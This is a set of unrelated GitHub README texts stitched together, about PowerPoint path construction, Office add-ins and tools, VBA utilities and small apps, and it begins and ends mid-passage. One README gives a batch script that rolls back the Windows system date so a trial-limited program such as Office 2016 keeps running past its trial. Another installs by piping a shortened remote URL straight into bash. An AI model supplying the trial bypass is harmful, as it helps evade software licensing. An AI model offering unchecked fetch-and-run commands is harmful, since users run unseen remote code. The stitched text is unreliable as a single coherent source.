Now click on the plus (**+**) sign on the left of **Item 1**, then on the left of **Points**, and **Points(1)** as shown below:

![image](https://user-images.githubusercontent.com/80269251/117295606-0d59de00-ae42-11eb-88cf-b359973111de.png)

#### The Pivot Point
One can see that the first point of the path had become **(289, 338)** because of the transformations applied in the original object after the macro **createobj** is called as indicated in the macro **example**. Now all the paths can be traced with these coordinates as pointed out in the **Notes** in the PowerPoint window. These notes were written to help to locate the different paths in the **Watch** subwindow as indicated above. The notes are shown here for convenience:

```
Node 1 – 14: element 1, starts at (289, 338) 
Node 15: line to (289, 338), closes element 1
Nodes 16 – 30: element 2
Node 31: line to (289, 338)
Nodes 32 – 46: element 3
Node 47: line to (289, 338)
Node 48 – 62: element 4
Node 63: line to (289, 338)
Nodes 64 – 78: element 5
Node 79:  line to (289, 338)
Nodes 80 – 100 : basket
```

A more detailed explanation about this object can be found in the section [The Resulting Stack Icon](https://github.com/nilostolte/MicroVBA-PowerPoint#the-resulting-stack-icon).

The first noticeable detail is that the first object is special as one can easily deduce from the notes. It has only 14 nodes, while the other ""elements"" have 15 nodes. This is because its closing _""lineto""_ command is mingled in node 15, which closes ""element 1"". Since the first node can be thought as the first ""moveto"" of the whole path (passed as a parameter to **BuildFreeform**), this point becomes a kind of a pivot for all other subpaths as one could see when **Edit Points** has been chosen.

Afterwards each subpath has its own ""moveto"" (which is actually a ""lineto"") and a closing ""lineto"" (that could be the last point of a curveto but not in this example). In addition to that, after each subpath, there is a ""lineto"" back to the point **(289, 338)**, as seen in nodes 31, 47, 63 and 79. The last subpath, identified as ""basket"" does not need to redirect to the point **(289, 338)** because there are no further subpaths following it. Therefore, the nodes 31, 47, 63 and 79 function as a kind of a marker to separate subpaths.

#### Discovering the method accidently
This method looks quite verbose but it allows putting any subpath anywhere in the path as demonstrated. This trick was actually discovered by accident, because texts in [**menugraphics6**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/menuInforgraphics6.pptx) (marked in red below) which contains subpaths with ""holes"" (see section [Subtracting Shapes using Subpaths Winding](https://github.com/nilostolte/MicroVBA-PowerPoint#subtracting-shapes-using-subpaths-winding)) were the only texts to show up correctly. This was very puzzling since it is actually the most complex part of the menu items.

<p align=""center"">
  <img src=""https://user-images.githubusercontent.com/80269251/117304424-ba852400-ae4b-11eb-9b57-9d404473bbd4.png"">
</p>

Since that was highly unusual, and verifying what these texts were ""doing correctly"" that other texts and icons were obviously not (the errors are not shown above), the conclusion was this method, learned empirically, and shown above.

Microsoft apparently uses a different method to identify subpaths which is more compact but that is less flexible and more complex than the method shown above that looks quite robust.

As can be seen, the path used in this example is the icon of the second menu option above. The file  [**menugraphics6**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/menuInforgraphics6.pptx) is given so the different objects can be examined in the way exposed above. The gear icon in the third menu option is another interesting example because it implements a hole in the gear. However, any text is also a good example since most of them contain letters that produces ""holes"" in a previous subpath.

Also, a very important point is that the file [**menugraphics6**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/menuInforgraphics6.pptx) also demonstrates that vectorized texts are possible in PowerPoint presentations. Also, with vectorized texts, presentations can have a much better look, with a much better kerning and right justification.

## The Resulting Stack Icon

This example produces the icon of the second menu option of the file [**menugraphics6**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/menuInforgraphics6.pptx) as shown above.

<p align=""center"">
  <img src=""https://user-images.githubusercontent.com/80269251/117310644-74cb5a00-ae51-11eb-9aca-763522335f3d.png"">
</p>

As explained above, the icon, which was produced by the macro **createobj**, was modified on the fly by the macro **example**. Since the object is indivisible, one can scale it at will and all the points are scaled accordingly. Notice that the macro **createobj**, whose code is shown in the section [Understanding PowerPoint Internal Path Representation](https://github.com/nilostolte/MicroVBA-PowerPoint#understanding-powerpoint-internal-path-representation) above, is actually a snippet from a MicroVBA code ([**macro.txt**](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/MicroVBA%20Interpreter/macro.txt)) that produces the menu [menuinfographics6](https://github.com/nilostolte/MicroVBA-PowerPoint/blob/main/menuInforgraphics6.pptx), supplied in this repository.

This icon represents a stack with five elements being pushed or popped from the stack. The stack itself is represented here as a ""basket"", as it was mentioned in section [The Pivot Point](https://github.com/nilostolte/MicroVBA-PowerPoint#the-pivot-point) above, while the five objects in the stack are simply referenced as ""element 1"" to ""element&nbsp;5"".

One can manually obtain paths with subpaths by using the **Combine Shapes** menu, which is hidden in PowerPoint 2010. It actually produces paths in a similar way that was demontrated above.

In this example the subpaths do not overlap and it is a perfect example of **Shape Union**. One can reproduce this by creating different objects, selecting all of them, and then applying **Shape Union** operation. However, how can one reproduce a **Shape Subtraction** operation using the scheme just presented above?

## Subtracting Shapes using Subpaths Winding

When applying **Shape Union** all shapes are assumed to be ""winding"" in the same direction. If the shapes are winding in opposite directions and if they overlap, a subtraction takes place as shown in the figure below:

<p align=""center"">
  <img src=""https://user-images.githubusercontent.com/80269251/117321603-46527c80-ae5b-11eb-913b-4e3c90c0fbd6.png"">
</p>
 
As one can see in the figure a small circle is subtracted from the big circle by winding the small circle in the opposite way. Also, the small circle should be subtracted from the big one. If the opposite is done both objects disappear. One can think in terms that a ""negative object"" does not exist. Thus, to obtain an actual subtraction, both objects must overlap and if one is inside the other, the small should be subratcted from the big one, otherwise both objects disappear.

To accomplish subtractions with subpaths created as shown in section [**Contructing Paths in PowerPoint**](https://github.com/nilostolte/MicroVBA-PowerPoint#contructing-paths-in-powerpoint) above, the object to be subtracted should appear first. Then, if one wants the following subpath to be subtracted from the previous one, they should wind their points in the opposite way from each other. By defining paths using MicroVBA as explained, subtractions are automatic when the subpaths are winding in opposite directions. These are conventions that are common in vector graphics. 
In general, one can modify the ""winding rule"" to stop behaving in this way to avoid subtractions in non-convex surfaces that intersects itself. In Java, this is done by using the **setWindingRule** function of a Path2D. Normally, the default winding rule is **WIND_NON_ZERO**, which allows operating in this way also in Java paths. However in PowerPoint it seems this rule is always **WIND_NON_ZERO** and it cannot aapparently be modified.

The Corona pandemic is creating new rules and regultions for everyone to stay on top which people are together at what time. Companies are using different methods for tracking this. Some use pen and paper to track their visitors, others let their visitors write the information in an excel file. All of this does not show a that companies are digitized and they bring a rat-tail of follow-up work with it due to GDPR regulations. Also if a positive case is reported, the effort of finding who was in the office at that day is pretty inefficient.

This project aims to digitize the guest registration process and brings efficiency in the process for identifying whos was in the office, including the GDPR compliant deletion of the data. 

Technically this project is build on a React frontend and [Cockpit CMS}(https://getcockpit.com/) as backend.

This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).

## Installation from source

### Install Cockpit CMS
Download Cockpit CMS and install it on your fav. Web Server:
* `git clone https://github.com/agentejo/cockpit.git`

Navigate to http://<your_url>/cockpit, log in a generate an API Key.
Create a collection called ConnectedMACs with the fields: date (Text) and mac (Text)

### Install the client
Clone this repository.
Change the 'xxxtokenxxx' string in Config.js to the API key you have created.
* `npm install`
* `npm run build`

Copy the build to your Web Server.

### Assumptions
* React app will be deployed at /.
* The path to cockpit is <url of your react app>/cockpit

## Needed packages

Formik: For the input form
### `npm install formik`

Yup: For the form validations
### `npm install yup`

Bootstrap: For the styles
### `npm install react-bootstrap bootstrap`

Universal-Cookie: For the cookie handling
### `npm install universal-cookie`

React-Router-Dom: For the routing in the app
### `npm install react-router-dom`

HTML-react-parser:: For parsing html code
### `npm install html-react-parser`

## Available Scripts

In the project directory, you can run:

### `npm start`

Runs the app in the development mode.<br />
Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

The page will reload if you make edits.<br />
You will also see any lint errors in the console.

### `npm test`

Launches the test runner in the interactive watch mode.<br />
See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.

### `npm run build`

Builds the app for production to the `build` folder.<br />
It correctly bundles React in production mode and optimizes the build for the best performance.

The build is minified and the filenames include the hashes.<br />
Your app is ready to be deployed!

See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.

### `npm eject`

**Note: this is a one-way operation. Once you `eject`, you can’t go back!**

If you aren’t satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.

Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you’re on your own.

You don’t have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn’t feel obligated to use this feature. However we understand that this tool wouldn’t be useful if you couldn’t customize it when you are ready for it.

## Learn More

You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).

Todo-iz is a todo list Application inspired by the clear Todo app which incorporates Realm Database as the backend. 

## Description
The app consits of two ViewControllers - a Main ViewController and a Detailed ViewController. The Main ViewController has a TableView of all the To-do list categories. When you add a category to the list items, then you add additional items to the list, it makes a different todo list items that show up as individual colours and when you add more items it creates a amazing gradient colour which goes from lighter to darker. 

## Tech
- This application incorporates the use of cocoaPods for the gradient feature and for the swipe to delete capability. 
- All of the data is saved and persisted locally to the Realm database. 
- Transferring data through multiple View Controllers.
- Implemting the proper use of the Model View Controller. MVC

Just a wee little simple hack to change your Windows system time into the programs time trial, launch, then back to normal :) The provided example is for Office 2016 but should work for any Windows program with a basic time trial. Even create a more pretty shortcut to add to your desktop and/or start menu!

## Setup 
Here we have a copy of the Run_Example.cmd and is the template for doing this mini hack. 

``` 
set MMDDYYYY=%DATE:~4,2%-%DATE:~7,2%-%DATE:~10,4%
date MM-DD-YYYY
cd \path\to\program\file
start PROGRAMNAMEHERE.EXE
timeout 5
date %MMDDYYYY%
```
Firstly: Download this repo to your computer and open `Run_Example.cmd` in your favoite editor, or right click it and choose 'edit'. Find Line 2 (It should be `date MM-DD-YYYY`) to a date that would be inside the trial of the program. (ex. `date 01/18/2021`)

Secondly you will need to get the path to the program you want to launch and replace `\path\to\program\file\location` with it. For example Office 2016 is `\Program Files (x86)\Microsoft Office\root\Office16` You can find this path a coupple ways

- Be an absolute nerd and know how to find the path
- Or For everyone else: 
1. Go to your start menu 
2. Find the program you want
3. Right click it
4. Hover over `More` 
5. Choose `Open file location`. 
- This will open the Start Menu shortcut folder 
6. Right click once again the shortcut to your desired program and choose `Open file location`
- Well done! You can follow instructions! Click the Adress Bar (You know the little thing that says ` This PC > Windows(C:) > Program Files > ect...`) And highlight and copy the full path EXCEPT the `C:` (If it is anywhere but the C drive you will need to add somthing to your .cmd file, I'll get back to that)
- With your path copied go ahead and head over to the Run_Example.cmd file in this project and replace the `\path\to\program\file`
- If your program is not located on the main C drive modify the line above the `cd \path\to\program\file` line and put the letter of the drive letter in place of the C: , ex. Z: 

Lastly: Replace in line 5 (`start PROGRAMNAMEHERE.EXE`) PROGRAMNAMEHERE.EXE with the program name as named and highlighted in that directory (ex. Word 2016 is `WINWORD.EXE`) You may now go ahead and save that as whatever name you want, in a memorable location. You may choose to save it to your desktop but you will need to remember to run this script as administrator. Or... you can.....

## Create a shortcut! The pro way!
Many dont realize, there is alot more to shortcuts then seems! Lets start off (obviously) by finding the .cmd file we just made, wherever you saved it, right click, and choose ""create a shortcut"" !! Guess were done here then!!

I kidddd we aint though yet.. Rightclick the newly made shortcut, and go to the properties there are a few things you can do but one thing thats required.
- Firstly the requirment, in the `shortcut` tab in the properties. And go to ""advanced"". Here you should set ""run as administrator"" 
- Now click OK and go back. You may also opt to set ""Run"" to minimized so you dont have to see anything. The program will automagicaly terminate and close once done. This just makes things cleaner.
- A big thing you can do (other then renaming it) is to make it look like a pretty program insted of some script. In sthe same shortcut tab, choose `Change Icon`. You can choose one of the windows default icons but if you click browse and head to the location of the program you want to run, clicking on it, and hitting `open` a bunch of icons for that specific program will pop up. You can now make your script shortcut look like a general shortcut to the program! Aint that neat?


For more ease of acess after you are done editing the shortcut and rename it, you can make a copy of that shortcut to `C:\Users\Cyourusername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs` to have easy access to launch this program from the start menu with the ""hack"" in place! Feel free to delete the orginal shortcut to not make things confusing!

## How it works, 
- This program is really simple it starts by storing the current date (Line1) Don't ask me how that works. I'm a programer, I rely on StackOverflow to find how to do things. Find an answer [Here.](https://stackoverflow.com/questions/36147552/what-does-date-4-4date-10-2date-7-2-time0-2time3-2-mean) I moved things around and added some dashes to format it correctly so it could be used while resetting the date.  
- Then setting your computers date to the desired (Line 2)
- Starting the program under the desired time (lines 3-5)
- Waiting....
- Then it resets the date back to where it was when the program started!

littlebutt,abstract_generator,,https://github.com/littlebutt/abstract_generator,https://api.github.com/repos/abstract_generator/littlebutt,一个可以通过WORD模板和EXCEL表格生成摘要的桌面小工具,"![LOGO](./static/favico.png)

# 简介

摘要生成工具是一个根据Word模板将Excel文件整合成一段摘要文字的桌面小工具。该工具支持高度自定义的摘要内容以及丰富的数据计算函数，并以Word文档的格式展现最终结果。

# 使用方法

## Excel文档

需要准备一个Excel工作簿作为数据来源。该工作簿需要包含至少一个工作表（Sheet），若有多个工作表需要格式保持一致。比如，每个工作表的表头、列名、行名都一致，但是内容分别刻画不同阶段的数据。具体参考`test/2022年7月能源统计数据.xlsx`。`

## Word模板

需要准备一个Word文档作为模板。除了必要的描述性的摘要文字，数据部分需要用一对大括号`{}`来引用上述Excel文档中的内容。大括号中具体内容如下：

|括号内容|引用内容|举例|
|:------|:------|:------|
|{row,col}|工作表列表内最后一张表中，行号为row，列号为col的数据|{2，C}|
|{row,col,sheet_name}|sheet_name工作表中，行号为row，列号为col的数据|{2,C,Sheet1}|
|{SUM(row,col)}|工作表列表内所有行号为row，列号为col的数据的总和|{SUM(5,B)}|
|{AVG(row,col)}|工作表列表内所有行号为row，列号为col的数据的平均值|{AVG(5,B)}|
|{MAX(row,col)}|工作表列表内所有行号为row，列号为col的数据的最大值|{MAX(5,B)}|
|{MIN(row,col)}|工作表列表内所有行号为row，列号为col的数据的最小值|{MIN(5,B)}|
|{CMP(row,col)}|工作表列表内最后一张表中，行号为row，列号为col的数据的环比增量（与前一张表相比），未实现|{CMP(5,B)}|

目前部分功能有待完善，且大括号内的内容必须严格按照定义书写，列名必须大写，逗号必须是半角逗号，且不能有空格。具体参考`test/2022年下半年能源统计数据摘要.docx`

Personal configuration for windows 10 (2004)

This is my current setup for windows and some common MS office programs, so something like linux `dotfiles` just for windows I guess. There a few (IMO) neat things in here that may be useful to others, hich is why I made this repo public. The core features can be split into two seperate configurations, 1 for personal and the other for work. 
## OS configurations

### [workspacer](https://www.workspacer.org)
A fantastic tool currently being developed. It still has a couple of limitations that make it a bit troublesome at times but overall it's quite good and does what I need it to.
My biggest issues so far:
* Lack of documentation (I just read most of the source code and will do my best to update the documentation so you won't have to)
* No dynamic reassignment of ` sticky workspaces` to available monitors, i.e. if I disconnect my laptop from my monitor (or there is any other screen change) then it'll just quit
 * Working on this currently
* Cannot __easily__ adjust window gaps in config file; 
 * I already found a way to adjust one of the `LayoutEngines (TallLayoutEngine)` but I don't really like the way I did it and it's not easily set in the config file so I might revisit this eventually


 ### [ThrottleStop](https://www.techpowerup.com/download/techpowerup-throttlestop/)
 An undervolting utility similar (but better than) Intel XTU. I use a laptop with an i7-7700HQ at home which, while decent performance wise, gets pretty hot for my liking. I leave almost everything at default and only play with the CPU/Cache & IGPU resulting in about 8-10 degrees lower temperatures.
 
     * CPU & Cache: -125 mV
     * IGPU:        -50  mV
 
 
### Dracula Terminal themes
Does what it says.. Dracula themes for `cmd` and `powershell`


### [PasteHere](https://github.com/tomzorz/PasteHere)
As someone using the `win+shift+s` quite a lot this is really great as I can skip the trip to MS paint to save my screenshot to a file directly

## MS Office configurations
I have tested these on both MS office 2016 as well as the 365 version but have not bothered with doing some other compatibility checks.

### 1. Rubberduck
![Rubberduck](https://user-images.githubusercontent.com/5751684/48656196-a507af80-e9ef-11e8-9c09-1ce3c619c019.png)

This is an amazing add-in for the VBE (Visual Basic Editor) that comes with all office applications. For details you can look  on [Github](https://github.com/rubberduck-vba/Rubberduck) or on the official [website](https://rubberduckvba.com).
It helps bring so much more productivity to writing VBA and I love it. The things I use the most are 
* Code Explorer 
  * I replaced the in-built project explorer with this.
  * Being able to see each sub function or variable from within the explorer makes finding relevant code much easier and gives it the feel of a real IDE
  * It also helps with organizing as you can group modules/sheets/userforms into `folders`. While these have 0 effect without Rubberduck they help creating logical groups that go beyond just modules and classes.
* Code inspections
  * just tons of ways on how to improve you code, make it more readable and more robust
* Auto completion

### 2.Excel/Word/Outlook/Powerpoint
* Quick-access toolbars: Probably the least useful to others but I like it, just have a look. The one that's actually being used the most is obviously the excel one. I use the numpad a lot and most of these are set up in such a way that I can fully utilize this for features that otherwise would take *4+* characters

* Powerpoint Slide numbering add-in:
    * A small macro I wrote that *before saving* adjusts the slide numbers based on the number of *visible* slides. I had this issue in the past that when exporting Powerpoint to PDF some slides were hidden but the slide numbers didn't update accordingly. This meant that in the PDF you'd ""randomly"" jump from slide 5 to 10 for instance. Since in most of my templates I have many optional slides that users can simply hide I found this to be a decent way for PDF's to still be consistent in numbering. Just save the file and then print/export it and the slide numbers will look like there were never any hidden slides ;).

### 3. VBE Theme color editor
A custom editor I found [here](https://github.com/dimitropoulos/VBECustomColors) on github. 
I added the dracula palette because that's what I'm currently using for cmd/powershell as well. It still needs some tweaking so I might change one or two things. If I switch to something else I'll also update this one (gruvbox, looking at you)


## Other program configs
*  [Dracula for Visual Studio](https://github.com/dracula/visual-studio)


## TODO
- [x] Try out [workspacer](https://www.workspacer.org/)
- [ ] Refine dracula theme for **VBE**


# Previously Used

### Autohotkey  
 A combination of a couple of autohotkey scripts and set-ups I gathered and modified. Uses the `VirtualDesktopAccessor.dll` and basically tries to emulate the `i3wm` setup I use on Linux.
The main purpose is for resizing windows (minimize & maximize) as well as moving them around my virtual desktops.

### [PowerToys](https://github.com/microsoft/PowerToys)
Here I use mostly `FancyZones` with the remaining stuff turned off. Same as the AHK scripts the idea is to emulate my i3wm setup. The zones here are supposed to substitute the tiling approach and while they do a decent job it's still not really what I am looking for.

Yohanna,PowerExport,,https://github.com/Yohanna/PowerExport,https://api.github.com/repos/PowerExport/Yohanna,Change export resolution of PowerPoint slides.,"# About #

Ever had to save your PowerPoint slides as a picture and wasn't satisfied with the resolution of the files? PowerExport provides an easy way to change the default export resolution (96 dpi) of PowerPoint slides.

# Usage

- In order for PowerExport to detect resolution settings correctly you need to run PowerPoint at least once since certain registry values are created when PowerPoint run for the first time on the computer. 

- Select the required resolution from the Resolutions combo box and select the office version which you want to change its export resolution.

- Be advised that only the installed versions of office are shown in the combo box. If you have an office version that's not detected refer to the first step or submit an issue.


# Limitations #

The following export resolutions are supported:


|Full-screen pixels (horizontal × vertical) | Widescreen pixels (horizontal × vertical) | per inch (horizontal and vertical) |
|:------------:|:--------------:|:-------------:|
|500 × 375	 | 667 × 375	|	50 dpi			|
|960 × 720	 | 1280 × 720 	|	96 dpi (default)|
|1000 × 750	 | 1333 × 750	| 100 dpi 			|
|1500 × 1125 | 2000 × 1125	| 150 dpi			|
|2000 × 1500 | 2667 × 1500	| 200 dpi 			|
|2500 × 1875 | 3333 × 1875	| 250 dpi 			|
|3000 × 2250 | 4000 × 2250	| 300 dpi 			| 


- Note that the maximum supported resolution by PowerPoint is 307 dpi.

Modify MSOffice language on macOS

## Background
Microsoft Office on macOS does not provide the option to modify the language, so we can only modify its display language through the command line, which is not very convenient.

## Features
- Chinese language support
- English language support
- Customized language support
- Support for viewing current language

## Usage
#### Not China Mainland
~~~shell
bash <(curl -Ls https://git.io/JDzTh)
~~~

#### China Mainland
~~~shell
bash <(curl -Ls https://cdn.jsdelivr.net/gh/missuo/MSOffice-Language-Modify/msoffice.sh)
~~~

## About custom languages
You should first find the language code supported by Microsoft Office. Then enter the language code you found to complete the modification.

## Feedback

<p><a href=""#Introduction"">Introduction</a><br>
<a href=""#GettingStarted"">Getting Started and Setting up the Visual Studio Solution</a><br>
<a href=""#LinkToBinaries"">Links to HySpell Spellchecker Installers</a><br></p>
<h3><a name=""#Introduction"">Introduction</a></h3>
<p>The current HySpell GitHub project introduces the open source release of the actual HySpell Armenian Spellchecker Microsoft Office Add-in tool. The repository contains the complete source code of the latest 3.0.1.0 release, the binaries of which were previously released only in commercial package form.</p>
<p>The main goal of the current software package, historically speaking, was to
introduce a complete and practical spell checking support for Armenian 
language
in major text processing software applications, such as, Microsoft 
Office Word
and Outlook, Adobe PageMaker/InDesign, OpenOffice, main web browsers, as
 well
as, other similar systems. Back in 2008, with the popularity and success
 of Hunspell package as an open source project, it was decided
to implement our linguistically complete spell check proof tool around 
Hunspell by introducing a .NET managed code wrapper upon
the C-code Hunspell library. Moreover, given the
capabilities of Hunspell in regards of the
constructability of affix rule and dictionary systems, it was proper for
 usage
on highly inflectional language, such as Armenian. After a year of 
linguistic
work, an extensive lexicon of more than 150 thousand base words were 
collected
and corrected to form the base dictionary file. Moreover, to capture all
possible Armenian words, more than 300 affix rules were constructed, 
bringing
the spell check accuracy to near 95%.</p>
<p>Subsequent
versions of HySpell improved the software system both
in integration with applications and the linguistic accuracy of the proofing
tool. Given the fact that Hunspell got integrated
with all major word processing applications, such as: Mozilla software
(OpenOffice, Firefox), Adobe software (InDesign), support for Armenian spell
checking, automatically got carried over onto most application, with the
exception perhaps of the most important, namely, Microsoft Office suite (Word,
Outlook). </p>
<p>Since
Microsoft had no intention to integrate Hunspell as
alternative proofing engine to their proprietary language support interface,
even when Adobe adopted Hunspell as alternative, we
had no option but utilize Visual Studio Tools for Office (VSTO), in order to
implement Word and Outlook Add-in extensions to support the spell checking for
Armenian. Besides, given the fact that there are still a number of issues in
treatment of the Armenian language even at the Unicode level (for example
mid-word punctuation that is unique to Armenian language), language support at
a more custom level is required in the case of Armenian, and that VSTO Add-in
alternative did provide a few advantages. </p>
<p>The
current repository contains therefore the source code for this VSTO Add-in alternative
implementation of the Armenian language support in Microsoft Office Word and
Outlook (and for Windows OS).</p>
<p>The
current document also includes links to the actual compiled binaries, as well
as, language support for Mozilla series of applications, in particular, the
complete suite of OpenOffice, LibreOffice, Firefox, Thunderbird, SeaMonkey, Google Chrome web browser, Adobe suite, in
particular Adobe InDesign, and almost any software that is integrated with Hunspell. </p>
<p>Note
that the proofing support at the web browser level (e.g. Firefox and Chrome),
implies proofing support in any web application, such as Google Docs, Gmail,
etc..</p>
<h3><a name=""user-content-GettingStarted"">Getting Started and Setting up the Visual Studio Solution</a></h3>
<p>The
current HySpell source code repository is prepared to
be used based on the following platform requirements:</p>
<ul>1.  Visual
Studio 2017 on Windows OS (or above). Note that ever since version 2015, Microsoft
has made free Community version of their Visual Studio, and Visual Studio 2017
contains all tools and features that are needed for HySpell
compilation. Developers may download Visual Studio 2017 via the following
link: 
<br><a href=""https://imagine.microsoft.com/en-us/Catalog/Product/530"">Microsoft Visual Studio 2017 Community Edition</a>
</ul>
<ul>2.  The
Visual Studio must be installed with all Office Customization templates and
run-times (i.e. VSTO).</ul>
<ul>3.  In
addition, to be able to compile the Setup project that exists in the HySpell VS solution, developers must also install Visual
Studio Setup/Installer Project templates. The Setup/ Installer project template
may be downloaded via the following link: 
<br><a href=""https://marketplace.visualstudio.com/items?itemName=VisualStudioProductTeam.MicrosoftVisualStudio2017InstallerProjects""> Microsoft Visual Studio 2017 Installer Projects</a>
</ul>
<p>Finally, also
note that in developing HySpell Armenian spellchecker
we took a strategic initiative in utilizing the popular Hunspell
C-library (developed by László Németh),
while in the initial releases, we wrote our own C++ wrapper to port the
C-library into .NET managed code, in the latest release of HySpell
(i.e. the current release), we utilized instead an extended version of 
such
wrapper, called NHunspell (developed by Thomas Maierhofer). The binaries
 of this .NET NHunspell.dll
library along with 64-bit and 32-bit binaries of the actual C-code 
Hunspell are already included in the current HySpell repository. 
Therefore, there is no need to download
anything from Hunspell or NHunspell
sites.</p>
<p>For the
completion of all references and to respect the open source MIT and/or LGPL
license terms of respective authors, we have included the links to NHunspell and Hunspell sites
below: </p>
<ul>NHunspell site: <a href=""http://www.nuget.org/packages/NHunspell/"">http://www.nuget.org/packages/NHunspell/</a><br>
Hunspell site: <a href=""https://github.com/hunspell/hunspell"">https://github.com/hunspell/hunspell</a></ul>
<p>After installing
and/or setting up all the required development tools and platforms, download the
HySpell source file package from the current GitHub repository
and extract source code files into a directory. Then, find and open the <b>HySpell.sln</b> solution file via the
Visual Studio 2017. The solution should initialize and load into the IDE, and
should look like the screenshot in Figure 1.</p>
<p><img src=""/image001.png"" border=""0"" style=""max-width:100%;""><br>
Figure 1. HySpell solution loaded in VS 2017</p>
<p>In
particular, the HySpell solution comprises of the
following VS projects:</p>
<ul>1.  <b>HySpell</b>, which is the
VSTO Word Add-in project, the main spellcheck controller that functions upon
the Word DOM.</ul>
<ul>2.  <b>HySpellOL</b>, which is the
VSTO Outlook Add-in project, the main spellcheck controller that functions upon
the Outlook DOM.</ul>
<ul>3.  <b>SetupApp</b>, which is the HySpell setup application project.</ul>
<ul>4.  <b>SetupForRequiredFiles</b>, which is the HySpell setup for the linguistic support files, along with
two extended Armenian keyboard layout drivers, standard Armenian fonts, and
other auxiliary support files.</ul>
<p>Finally, in order to be able to debug HySpell source code, a version of Microsoft Office must be installed on the development machine. In particular, for HySpell Word Add-in, Word 2010 or above must be installed and activated, while for HySpellOL Outlook Add-in, Outlook 2010 (or above). Note that the current HySpell version is tested against Windows 7, Windows 8 and Windows 10, with Microsoft Office versions 2007, 2010, 2013, 2016, Office 365, and all respective editions.

asparagustuss,VBA_Foundation_Functions,,https://github.com/asparagustuss/VBA_Foundation_Functions,https://api.github.com/repos/VBA_Foundation_Functions/asparagustuss,A Repo of VBA functions I have written over the years that provide a powerful base for VBA Development.,"# VBA_Foundation_Functions
A Repo of VBA functions I have written over the years that provide a powerful base for VBA Development.

I like to think of all the functions in this libary as foundation functions that should have been built into VB in the first place. It's broken into the following catagories:

1. General: VBA Functions that could probably be used in any app.
2. Access: Specific To Access.
3. Access_Excel_Interact: Used for Excel Doc interaction from within Access.
4. VBA_IDE: Functions that edit VBA IDE Code itself.
5. Example-Access_Auto_ACCDE_Creation - End user front end ACCDE creation is simplified into a single subroutine.

*Notes:*
1. *I intentionally do not use OnError unless its required to make the function operate. I perfer to handle errors in the main function that called these foundation functions. Just pretend these are built into VBA and handle errors like you normally would.*
2. *I intentionally leave all variable declarations on a seperate lines. These are functions I have written or collected over a long period of time. I find it helps to break everything down just in case i need to look into how something works again.*

**General Functions**
- AppendTXTFile: Add passed string to end of txt file.
- ArraySearch: Find a value in a specific Array column.
- ArraySearchComp: Find a value in a specific Array column with textcompare.
- ArraySearch_All: Checks if value exist in any Array column.
- BrowseForFile: Create a browse for file dialog box. returns selected filename.
- BrowseForFolder: Create a browse for folder dialog box. returns selected folder.
- CreateDirectory: Create Dir if not exists.
- CopyFile: Creates a copy of a file.
- CreateFolder: if folder does not exist create
- DeleteFile: Deletes File if exists.
- DeleteFolder: Deletes Folder if exists.
- DebugPrintArray: Debug print entire array.
- ForceCompileProject: Complies your code programmatically.
- FileExists: Check if file exist.
- GetBetween: Returns strings inbetween two strings.
- GetFileCount: Returns total files in folder.
- GetFilenameFromPath: Returns the rightmost characters of a string upto but not including the rightmost '\'.
- IsBlankOrNull: Returns true if passed value is null or """" reguardless of variable type. I use this so much I almost forget its not a built in VBA Function.
- IsFileOpen: Verifies if file is actively open on this or another computer.
- IsNumberKeyPress: Verifies if character passed is number or numberpad number character.
- IsProcessRunning: Use to check active windows processes.
- openfile: Open file if exists.
- Pause: Waits X time in seconds.
- RandomNumberBetween: Returns random number between uper and lower passed values.
- RandomWeightedNumber: Returns random weighted value from array.
- RemoveExtraSpaces: Removes all double spaces from passed string.
- TransposeArray: Swaps column and rows of an array.
- WaitForTime: Waits until the specified date and time.

**Access Functions**
- Backup_BE_Tables: Backup all tables in database to specified folder. 
- ChangeProperty: Changes access option properties. Usefull when automating the creation of an ACCDE file.
- CloseAllOpenForms: Close all open Forms.
- CompactAndRepairAll: Automates the compact and repair of all linked tables in a database. The user must still click an 'ok' button for every linked Backend file associated with tables.
- Create_ACCDE_File: Automatically creates an ACCDE File with appropriate settings and such for a clean accde view.
- CreateTableArray: Conversts a table into an array.
- ErrorHandelerMsgBoxLog: Use this in your error handle routines instead of msgbox. Write errors to txt file and or a Table. Passes error to msgbox for user visibility.
- ExportTableExcel: Exports table to Excel File with option to exclude columns by name.
- IsFormOpen: Checks is form is already open.
- IsFormLoaded: A more robust version of isformopen, but allows the detection of subforms. Use LookupFormName and LookupControl to speed up subform open find.
- ListboxSelectionClear: Clears Listbox selections.
- ListboxSelectionArray: Transfer selected items in a listbox to an array.
- RelinkBackend: Relink the tables to new backend filenamepath.
- RefreshODBCLinks: Refresh ODBC Connections.
- RepairDatabase: Automates the compact and repair of specified linked table. The user must still click an 'ok' button.
- VerifyReqFields: Validates all required fields on a form are not blank. If any are blank tells user which field it is returns false.

matthieujabbour,stumpfi,,https://github.com/matthieujabbour/stumpfi,https://api.github.com/repos/stumpfi/matthieujabbour,One doc format to rule them all.,"# stumpfi

One doc format to rule them all.


## Installation

```bash
yarn add stumpfi
```

## Getting started

Check the [example](https://github.com/matthieujabbour/stumpfi/tree/master/example) to see how it works !

You can learn the basics of stumpfi reading [this page](https://github.com/matthieujabbour/stumpfi/wiki/Concepts).


## API documentation

You can find the full documentation [here](https://htmlpreview.github.io/?https://raw.githubusercontent.com/matthieujabbour/stumpfi/master/doc/index.html)


## Why stumpfi ?

The idea came when I was working in the company I co-founded. I made four main statements, that are especially true for office apps :

1. There is a large quantity of documents formats that exist, some of them having the same purpose, and each software handles one or more of those formats. This makes software interoperability very tough and unefficient, and reusing contents from one app to another can be a nightmare.

2. Some apps provide features to convert from one format to another to achieve interoperability, but this can generate some information loss due to each format specifications (e.g. converting an HTML document to PDF inevitably results in a less-rich document).

